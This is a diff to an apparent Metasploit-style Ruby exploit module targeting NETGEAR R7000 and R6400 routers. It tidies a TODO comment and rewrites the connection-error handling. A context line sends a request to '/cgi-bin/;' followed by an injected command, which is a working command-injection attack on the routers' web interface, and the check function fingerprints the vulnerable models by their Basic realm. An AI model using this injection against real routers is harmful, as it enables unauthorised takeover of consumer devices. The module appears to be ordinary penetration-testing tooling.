@@ -47,7 +47,7 @@ def check
     'method' => 'HEAD',
     'uri'    => normalize_uri(@uri)
   })
-      # TODO: fix line 53, this isn't working right
+      # TODO: fix line 52, this isn't working right
       #This is supposed to parse the WWW-Authenticate: Basic realm="ROUTER HARDWARE"
       m = res.body.match(/Basic realm="NETGEAR R7000"/ || /Basic realm="NETGEAR R6400"/)
 
@@ -73,14 +73,14 @@ end
     begin
       #send the request containing the edited command
       send_request_raw({'uri' => "/cgi-bin/;#{cmd}"})
-    rescue Rex::ConnectionTimeout
-      print_error("Connection timed out to #{rhost}")
-    rescue Rex::ConnectionError
-      print_error("Error connecting to #{rhost}")
-    rescue Rex::ConnectionRefused
-      print_error("Connection refused to #{rhost}")
-    else
-      print_error("An error occured")
+    rescue Rex::ConnectionTimeout => ct
+      print_error(ct.message)
+    rescue Rex::ConnectionError => ce
+      print_error(ce.message)
+    rescue Rex::ConnectionRefused => cr
+      print_error(cr.message)
+    rescue Rex::Exception => e
+      print_error(e.message)
     end
   end
 end
